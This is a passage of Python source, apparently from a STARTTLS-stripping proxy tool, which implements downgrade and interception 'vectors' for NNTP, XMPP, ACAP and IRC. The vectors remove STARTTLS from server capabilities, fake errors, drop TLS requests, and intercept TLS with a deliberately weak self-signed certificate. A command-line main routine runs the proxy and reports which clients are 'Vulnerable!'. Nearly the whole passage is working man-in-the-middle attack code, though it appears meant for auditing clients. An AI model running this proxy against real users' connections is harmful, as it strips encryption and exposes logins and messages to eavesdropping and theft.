                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_KEYFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    # outbound ssl
                    
                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if not resp_data.startswith("234"):
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                    
                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))
    
                    data=None
                elif "USER " in data:
                    rewrite.set_result(session, True)
                return data
            
    class NNTP:
        _PROTO_ID = 119
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if session.outbound.sndbuf.strip().lower()=="capabilities" \
                    and "STARTTLS" in data:
                    features = (f for f in data.strip().split('\n') if not "STARTTLS" in f)
                    data = '\n'.join(features)+"\r\n"
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif "GROUP " in data:
                    rewrite.set_result(session, True)
                return data
        
        class StripWithError:
            ''' 1) force server error on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    session.inbound.sendall("502 Command unavailable\r\n")  # or 580 Can not initiate TLS negotiation
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("502 Command unavailable\r\n")))
                    data=None
                elif "GROUP " in data:
                    rewrite.set_result(session, True)
                return data
    
        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    # do inbound STARTTLS
                    session.inbound.sendall("382 Continue with TLS negotiation\r\n")
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr("382 Continue with TLS negotiation\r\n")))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_KEYFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    # outbound ssl
                    
                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if not resp_data.startswith("382"):
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                    
                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))
                                  
                    data=None
                elif "GROUP " in data:
                    rewrite.set_result(session, True)
                return data
    
    class XMPP:
        _PROTO_ID = 5222

        @staticmethod
        def _detect_starttls_tag_start_end(data):
            start = data.index("<starttls")
            try:
                end = data.index("</starttls>", start) + len("</starttls>")
            except ValueError:
                end = data.index("/>", start) + len("/>")
            return start, end

        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if "<starttls" in data:
                    start, end = Vectors.XMPP._detect_starttls_tag_start_end(data)
                    data = data[:start] + data[end:]        # strip starttls from capabilities
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "<starttls" in data:
                    # do not respond with <proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>
                    #<failure/> or <proceed/>
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                    #session.inbound.sendall("<success xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")  # fake respone
                    #data=None
                elif any(c in data.lower() for c in ("</auth>","<query","<iq","<username")):
                    rewrite.set_result(session, True)
                return data 

        class StripInboundTLS:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) If starttls is required outbound, leave inbound connection plain - outbound starttls
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if "<starttls" in data:
                    start, end = Vectors.XMPP._detect_starttls_tag_start_end(data)
                    starttls_args = data[start:end]
                    data = data[:start] + data[end:]        # strip inbound starttls
                    if "required" in starttls_args:
                        # do outbound starttls as required by server
                        session.outbound.sendall("<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")
                        logger.debug("%s [client] => [server][mangled] %s"%(session,repr("<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")))
                        resp_data = session.outbound.recv_blocked()
                        if not resp_data.startswith("<proceed "):
                            raise ProtocolViolationException("whoop!? server announced STARTTLS *required* but fails to proceed.  proto violation: %s"%repr(resp_data))

                        logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                        session.outbound.ssl_wrap_socket()
                return data

            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "<starttls" in data:
                    # do not respond with <proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>
                    #<failure/> or <proceed/>
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                    #session.inbound.sendall("<success xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")  # fake respone
                    #data=None
                elif any(c in data.lower() for c in ("</auth>","<query","<iq","<username")):
                    rewrite.set_result(session, True)
                return data

        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "<starttls " in data:
                    # do inbound STARTTLS
                    session.inbound.sendall("<proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr("<proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE,
                                            keyfile=Vectors._TLS_KEYFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    # outbound ssl

                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if not resp_data.startswith("<proceed "):
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))

                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))

                    data=None
                elif "</auth>" in data:
                    rewrite.set_result(session, True)
                return data

    class ACAP:
        #rfc2244, rfc2595
        _PROTO_ID = 675
        _REX_CAP = re.compile(r"\(([^\)]+)\)")
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if all(kw in data for kw in ("ACAP","STARTTLS")):
                    features = Vectors.ACAP._REX_CAP.findall(data)  # features w/o parentheses
                    data = ' '.join("(%s)"%f for f in features if not "STARTTLS" in f)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if " STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif " AUTHENTICATE " in data:       
                    rewrite.set_result(session, True)
                return data
        
        class StripWithError:
            ''' 1) force server error on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if " STARTTLS" in data:
                    id = data.split(' ',1)[0].strip()
                    session.inbound.sendall('%s BAD "command unknown or arguments invalid"'%id)  # or 580 Can not initiate TLS negotiation
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr('%s BAD "command unknown or arguments invalid"'%id)))
                    data=None
                elif " AUTHENTICATE " in data:
                    rewrite.set_result(session, True)
                return data
    
        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if " STARTTLS" in data:
                    # do inbound STARTTLS
                    id = data.split(' ',1)[0].strip()
                    session.inbound.sendall('%s OK "Begin TLS negotiation now"'%id)
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr('%s OK "Begin TLS negotiation now"'%id)))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_KEYFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    # outbound ssl
                    
                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if not " OK " in resp_data:
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                    
                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))
    
                    data=None
                elif " AUTHENTICATE " in data:
                    rewrite.set_result(session, True)
                return data

    class IRC:
        #rfc2244, rfc2595
        _PROTO_ID = 6667
        _REX_CAP = re.compile(r"\(([^\)]+)\)")
        _IDENT_PORT = 113
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if all(kw.lower() in data.lower() for kw in (" cap "," tls")):
                    mangled = []
                    for line in data.split("\n"):
                        if all(kw.lower() in line.lower() for kw in (" cap "," tls")):
                            # can be CAP LS or CAP ACK/NACK
                            if " ack " in data.lower():
                                line = line.replace("ACK","NAK").replace("ack","nak")
                            else:   #ls
                                features = line.split(" ")
                                line = ' '.join(f for f in features if not 'tls' in f.lower())
                        mangled.append(line)
                    data = "\n".join(mangled)
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return 
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                #elif all(kw.lower() in data.lower() for kw in ("cap req","tls")):
                #    # mangle CAPABILITY REQUEST
                #    if ":" in data:
                #        cmd, caps = data.split(":")
                #        caps = (c for c in caps.split(" ") if not "tls" in c.lower())
                #        data="%s:%s"%(cmd,' '.join(caps))
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
        
        class StripWithError:
            ''' 1) force server error on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    params = {'srv':'this.server.com',
                              'nickname': '*',
                              'cmd': 'STARTTLS'
                              }
                    # if we're lucky we can extract the username from a prev. server line
                    prev_response = session.outbound.recvbuf.strip()
                    if prev_response:  
                        fields = prev_response.split(" ")
                        try:
                            params['srv'] = fields[0]
                            params['nickname'] = fields[2]
                        except IndexError:
                            pass
                    session.inbound.sendall("%(srv)s 691 %(nickname)s :%(cmd)s\r\n"%params)
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("%(srv)s 691 %(nickname)s :%(cmd)s\r\n"%params)))
                    data=None
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
        
        class StripWithNotRegistered:
            ''' 1) force server wrong state on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    params = {'srv':'this.server.com',
                              'nickname': '*',
                              'cmd': 'You have not registered'
                              }
                    # if we're lucky we can extract the username from a prev. server line
                    prev_response = session.outbound.recvbuf.strip()
                    if prev_response:  
                        fields = prev_response.split(" ")
                        try:
                            params['srv'] = fields[0]
                            params['nickname'] = fields[2]
                        except IndexError:
                            pass
                    session.inbound.sendall("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)))
                    data=None
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            
        class StripCAPWithNotRegistered:
            ''' 1) force server wrong state on client sending CAP LS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "CAP LS" in data:
                    params = {'srv':'this.server.com',
                              'nickname': '*',
                              'cmd': 'You have not registered'
                              }
                    # if we're lucky we can extract the username from a prev. server line
                    prev_response = session.outbound.recvbuf.strip()
                    if prev_response:  
                        fields = prev_response.split(" ")
                        try:
                            params['srv'] = fields[0]
                            params['nickname'] = fields[2]
                        except IndexError:
                            pass
                    session.inbound.sendall("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)
                    logger.debug("%s [client] <= [server][mangled] %s"%(session,repr("%(srv)s 451 %(nickname)s :%(cmd)s\r\n"%params)))
                    data=None
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            
        class StripWithSilentDrop:
            ''' 1) silently drop starttls command
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    data=None
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
    
        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if " ident " in data.lower():
                    #TODO: proxy ident
                    pass
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    # do inbound STARTTLS
                    params = {'srv':'this.server.com',
                              'nickname': '*',
                              'cmd': 'STARTTLS'
                              }
                    # if we're lucky we can extract the username from a prev. server line
                    prev_response = session.outbound.recvbuf.strip()
                    if prev_response:  
                        fields = prev_response.split(" ")
                        try:
                            params['srv'] = fields[0]
                            params['nickname'] = fields[2]
                        except IndexError:
                            pass
                    session.inbound.sendall(":%(srv)s 670 %(nickname)s :STARTTLS successful, go ahead with TLS handshake\r\n"%params)
                    logger.debug("%s [client] <= [      ][mangled] %s"%(session,repr(":%(srv)s 670 %(nickname)s :STARTTLS successful, go ahead with TLS handshake\r\n"%params)))
                    context = Vectors.GENERIC.Intercept.create_ssl_context()
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_KEYFILE)
                    logger.debug("%s [client] <= [      ][mangled] waiting for inbound SSL handshake"%(session))
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logger.debug("%s [client] <> [      ]          SSL handshake done: %s"%(session, session.inbound.socket_ssl.cipher()))
                    # outbound ssl
                    
                    session.outbound.sendall(data)
                    logger.debug("%s [      ] => [server][mangled] %s"%(session,repr(data)))
                    resp_data = session.outbound.recv_blocked()
                    logger.debug("%s [      ] <= [server][mangled] %s"%(session,repr(resp_data)))
                    if not " 670 " in resp_data:
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                    
                    logger.debug("%s [      ] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
                    logger.debug("%s [      ] <> [server]          SSL handshake done: %s"%(session, session.outbound.socket_ssl.cipher()))
    
                    data=None
                elif any(kw.lower() in data.lower() for kw in ('authenticate ','privmsg ', 'protoctl ')):
                    rewrite.set_result(session, True)
                return data


class RewriteDispatcher(object):
    def __init__(self, generic_tls_intercept=False):
        self.vectors = {}   # proto:[vectors]
        self.results = []   # [ {session,client_ip,mangle,result}, }
        self.session_to_mangle = {}  # session:mangle
        self.generic_tls_intercept = generic_tls_intercept
        
    def __repr__(self):
        return "<RewriteDispatcher ssl/tls_intercept=%s vectors=%s>"%(self.generic_tls_intercept, repr(self.vectors))
    
    def get_results(self):
        return self.results
    
    def get_results_by_clients(self):
        results = {}    #client:{mangle:result}
        for r in self.get_results():
            client = r['client']
            results.setdefault(client,[])
            mangle = r['mangle']
            result = r['result']
            results[client].append((mangle,result))
        return results
    
    def get_result(self, session):
        for r in self.get_results():
            if r['session']==session:
                return r
        return None
    
    def set_result(self, session, value):
        r = self.get_result(session)
        r['result'] = value
          
    def add(self, proto, attack):
        self.vectors.setdefault(proto,set([]))
        self.vectors[proto].add(attack)
        
    def get_mangle(self, session):
        ''' smart select mangle
            return same mangle for same session
            return different for different session
            try to use all mangles for same client-ip
        '''
        # 1) session already has a mangle associated to it
        mangle = self.session_to_mangle.get(session)
        if mangle:
            return mangle
        # 2) pick new mangle (round-robin) per client
        #    
        client_ip = session.inbound.peer[0]
        client_mangle_history = [r for r in self.get_results() if r['client']==client_ip]
        
        all_mangles = list(self.get_mangles(session.protocol.protocol_id))
        if not all_mangles:
            return None
        new_index = 0
        if client_mangle_history:
            previous_result = client_mangle_history[-1]
            new_index = (all_mangles.index(previous_result['mangle'])+1) % len(all_mangles)
        mangle = all_mangles[new_index]
            
        self.results.append({'client':client_ip,
                             'session':session,
                             'mangle':mangle,
                             'result':None}) 
 
        #mangle = iter(self.get_mangles(session.protocol.protocol_id)).next()
        logger.debug("<RewriteDispatcher  - changed vector: %s new: %s>"%(mangle,"False" if len(client_mangle_history)>len(all_mangles) else "True"))
        self.session_to_mangle[session] = mangle
        return mangle
        
    def get_mangles(self, proto):
        m = self.vectors.get(proto,set([]))
        m.update(self.vectors.get(None,[]))
        return m
        
    def mangle_server_data(self, session, data):
        data_orig = data
        logger.debug("%s [client] <= [server]          %s"%(session,repr(data)))
        if self.get_mangle(session):
            data = self.get_mangle(session).mangle_server_data(session, data, self)
        if data!=data_orig:
            logger.debug("%s [client] <= [server][mangled] %s"%(session,repr(data)))
        return data

    def mangle_client_data(self, session, data):
        data_orig = data
        logger.debug("%s [client] => [server]          %s"%(session,repr(data)))
        if self.get_mangle(session):
            #TODO: just use the first one for now
            data = self.get_mangle(session).mangle_client_data(session, data, self)
        if data!=data_orig:
            logger.debug("%s [client] => [server][mangled] %s"%(session,repr(data)))
        return data
    
    def on_recv_peek(self, s_in, session):
        if self.generic_tls_intercept:
            # forced by cmdline-option
            return Vectors.GENERIC.Intercept.on_recv_peek(session, s_in)
        elif hasattr(self.get_mangle(session), "on_recv_peek"):
            return self.get_mangle(session).on_recv_peek(session, s_in)

def generate_temporary_tls_certificate():
    """
    generate an intentionally weak self-signed certificate

    :param dst: destination file path for autogenerated server.pem
    """
    from OpenSSL import crypto
    import tempfile

    key = crypto.PKey()
    key.generate_key(crypto.TYPE_RSA, 1024)

    cert = crypto.X509()
    cert_subject = cert.get_subject()
    cert_subject.C = "IO"
    cert_subject.ST = "Striptls"
    cert_subject.L = "Striptls"
    cert_subject.O = "github.com/tintinweb"
    cert_subject.OU = "github.com/tintinweb"
    cert_subject.CN = "striptls.localhost.localdomain"
    cert.set_serial_number(1)
    cert.gmtime_adj_notBefore(-32 * 24 * 60 * 60)
    cert.gmtime_adj_notAfter(32 * 24 * 60 * 60)
    cert.set_issuer(cert_subject)
    cert.set_pubkey(key)
    cert.sign(key, 'sha1')

    tmp_fname = tempfile.mktemp(prefix="striptls-", suffix=".pem")
    with open(tmp_fname, 'w') as f:
        f.write('\n'.join([crypto.dump_certificate(crypto.FILETYPE_PEM, cert),
                           crypto.dump_privatekey(crypto.FILETYPE_PEM, key)]))

    return tmp_fname


def main():
    from optparse import OptionParser
    ret = 0
    usage = """usage: %prog [options]
    
       example: %prog --listen 0.0.0.0:25 --remote mail.server.tld:25 
    """
    parser = OptionParser(usage=usage)
    parser.add_option("-q", "--quiet",
                  action="store_false", dest="verbose", default=True,
                  help="be quiet [default: %default]")
    parser.add_option("-l", "--listen", dest="listen", help="listen ip:port [default: 0.0.0.0:<remote_port>]")
    parser.add_option("-r", "--remote", dest="remote", help="remote target ip:port to forward sessions to")
    parser.add_option("-k", "--key", dest="key", default="server.pem", help="SSL Certificate and Private key file to use, PEM format assumed [default: %default]")
    parser.add_option("-s", "--generic-ssl-intercept",
                  action="store_true", dest="generic_tls_intercept", default=False,
                  help="dynamically intercept SSL/TLS")
    parser.add_option("-b", "--bufsiz", dest="buffer_size", type="int", default=4096)
        
    all_vectors = []
    for proto in (v for v in dir(Vectors) if not v.startswith("_")):
        for test in (v for v in dir(getattr(Vectors,proto)) if not v.startswith("_")):
            all_vectors.append("%s.%s"%(proto,test))
    parser.add_option("-x", "--vectors",
                  default="ALL",
                  help="Comma separated list of vectors. Use 'ALL' (default) to select all vectors, 'NONE' for tcp/ssl proxy mode. Available vectors: "+", ".join(all_vectors)+""
                  " [default: %default]")
    # parse args
    (options, args) = parser.parse_args()
    # normalize args
    if not options.verbose:
        logger.setLevel(logging.INFO)
    if not options.remote:
        parser.error("mandatory option: remote")
    if ":" not in options.remote and ":" in options.listen:
        # no port in remote, but there is one in listen. use this one
        options.remote = (options.remote.strip(), int(options.listen.strip().split(":")[1]))
        logger.warning("no remote port specified - falling back to %s:%d (listen port)"%options.remote)
    elif ":" in options.remote:
        options.remote = options.remote.strip().split(":")
        options.remote = (options.remote[0], int(options.remote[1]))
    else:
        parser.error("neither remote nor listen is in the format <host>:<port>")
    if not options.listen:
        logger.warning("no listen port specified - falling back to 0.0.0.0:%d (remote port)"%options.remote[1])
        options.listen = ("0.0.0.0",options.remote[1])
    elif ":" in options.listen:
        options.listen = options.listen.strip().split(":")
        options.listen = (options.listen[0], int(options.listen[1]))
    else:
        options.listen = (options.listen.strip(), options.remote[1])
        logger.warning("no listen port specified - falling back to %s:%d (remote port)"%options.listen)
    options.vectors = [o.strip() for o in options.vectors.strip().split(",")]
    if 'ALL' in (v.upper() for v in options.vectors):
        options.vectors = all_vectors
    elif 'NONE' in (v.upper() for v in options.vectors):
        options.vectors = []

    if (options.generic_tls_intercept or any("Intercept" in v for v in options.vectors)) and not os.path.exists(options.key):
        # try to generate a server.pem if it is missing even-though interception was selected.
        logger.warning("[!] tls certificate/key-file %r does not exist. trying to create a self-signed certificate for your convenience." %
                       options.key)

        try:
            options.key = generate_temporary_tls_certificate()
            logger.info("[i] created a temporary tls certificate/key-file: %r " % options.key)
        except ImportError, ie:
            logger.warning("[!] tls certificate/key-file could not be created due to unmet dependencies. Please `pip install` missing dependencies: %r" % ie)
        except Exception, e:
            logger.warning("[!] tls certificate/key-file failed to create self-signed certificate. error: %r " % e)

    Vectors._TLS_CERTFILE = Vectors._TLS_KEYFILE = options.key
          
    # ---- start up engines ----
    prx = ProxyServer(listen=options.listen, target=options.remote, 
                      buffer_size=options.buffer_size, delay=0.00001)
    logger.info("%s ready."%prx)
    rewrite = RewriteDispatcher(generic_tls_intercept=options.generic_tls_intercept)
    
    for classname in options.vectors:
        try:
            proto, vector = classname.split('.',1)
            cls_proto = getattr(globals().get("Vectors"),proto)
            cls_vector = getattr(cls_proto, vector)
            rewrite.add(cls_proto._PROTO_ID, cls_vector)
            logger.debug("* added vector (port:%-5s, proto:%8s): %s"%(cls_proto._PROTO_ID, proto, repr(cls_vector)))
        except Exception, e:
            logger.error("* error - failed to add: %s"%classname)
            parser.error("invalid vector: %s"%classname)

    logging.info(repr(rewrite))
    prx.set_callback("mangle_server_data", rewrite.mangle_server_data)
    prx.set_callback("mangle_client_data", rewrite.mangle_client_data)
    prx.set_callback("on_recv_peek", rewrite.on_recv_peek)
    try:
        prx.main_loop()
    except KeyboardInterrupt:
        logger.warning( "Ctrl C - Stopping server")
        ret+=1
        
    logger.info(" -- audit results --")
    for client,resultlist in rewrite.get_results_by_clients().iteritems():
        logger.info("[*] client: %s"%client)
        for mangle, result in resultlist:
            logger.info("    [%-11s] %s"%("Vulnerable!" if result else " ",repr(mangle)))
        
    sys.exit(ret)
    
if __name__ == '__main__':
    main()